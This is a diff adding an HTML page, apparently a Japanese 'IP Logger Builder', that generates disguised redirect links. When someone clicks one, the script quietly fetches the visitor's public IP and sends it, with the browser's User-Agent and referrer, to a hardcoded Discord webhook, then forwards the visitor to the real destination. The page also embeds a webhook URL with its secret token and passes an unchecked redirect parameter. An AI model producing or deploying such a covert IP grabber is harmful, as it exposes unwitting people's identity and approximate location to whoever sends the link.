@@ -1,0 +1,95 @@
+<!-- language: HTML, file: index.html, target: Browser / Static Hosting -->
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger Builder</title>
+    <style>
+        body { background: #0f172a; color: #f8fafc; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 2rem; border-radius: 8px; width: 450px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
+        input, button { width: 100%; padding: 10px; margin-top: 10px; background: #0f172a; border: 1px solid #334155; color: #fff; border-radius: 4px; box-sizing: border-box; font-family: monospace; }
+        button { background: #3b82f6; cursor: pointer; border: none; font-weight: bold; }
+        button:hover { background: #2563eb; }
+        .section { margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card" id="builder-view">
+        <h2>IP Logger リンク作成</h2>
+        <div class="section">
+            <label>リダイレクト先 URL:</label>
+            <input type="text" id="redirect" placeholder="https://example.com">
+        </div>
+        <button onclick="generateLink()">リンクを生成</button>
+        <div class="section" id="result-box" style="display:none;">
+            <label>生成されたトラッカーURL:</label>
+            <input type="text" id="generated-url" readonly onclick="this.select()">
+            <button style="background: #10b981; margin-top: 5px;" onclick="copyLink()">クリップボードにコピー</button>
+        </div>
+    </div>
+
+    <script>
+        const FIXED_WEBHOOK = "https://discordapp.com/api/webhooks/1555186715466014862/0456yM7kfOwHW5-0olXBqF6rHXu-cWuCe1FCPRaA6CFwcmcKd7tH9uyN2WTY0sO8qoaa";
+
+        // URLパラメータがある場合はトラッカーとして動作させる
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetRedirect = urlParams.get('to');
+
+        if (targetRedirect) {
+            document.body.innerHTML = '<div style="background:#0f172a;color:#f8fafc;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;"><p>リダイレクト中...</p></div>';
+            
+            (async function() {
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    const clientIp = ipData.ip || '不明';
+
+                    const payload = {
+                        content: null,
+                        embeds: [{
+                            title: "IPが記録されました",
+                            color: 5814783,
+                            fields: [
+                                { name: "IPアドレス", value: "```" + clientIp + "```", inline: false },
+                                { name: "User-Agent", value: "```" + navigator.userAgent + "```", inline: false },
+                                { name: "リファラー", value: "```" + (document.referrer || 'Direct') + "```", inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    };
+
+                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                    navigator.sendBeacon(FIXED_WEBHOOK, blob);
+                } catch (e) {}
+
+                setTimeout(() => {
+                    window.location.href = decodeURIComponent(targetRedirect);
+                }, 500);
+            })();
+        }
+
+        function generateLink() {
+            const redirect = document.getElementById('redirect').value.trim();
+
+            if (!redirect) {
+                alert('リダイレクト先のURLを入力してください');
+                return;
+            }
+
+            const baseUrl = window.location.href.split('?')[0];
+            const finalLink = `${baseUrl}?to=${encodeURIComponent(redirect)}`;
+
+            document.getElementById('generated-url').value = finalLink;
+            document.getElementById('result-box').style.display = 'block';
+        }
+
+        function copyLink() {
+            const copyText = document.getElementById('generated-url');
+            copyText.select();
+            navigator.clipboard.writeText(copyText.value);
+            alert('リンクをコピーしました');
+        }
+    </script>
+</body>
+</html>
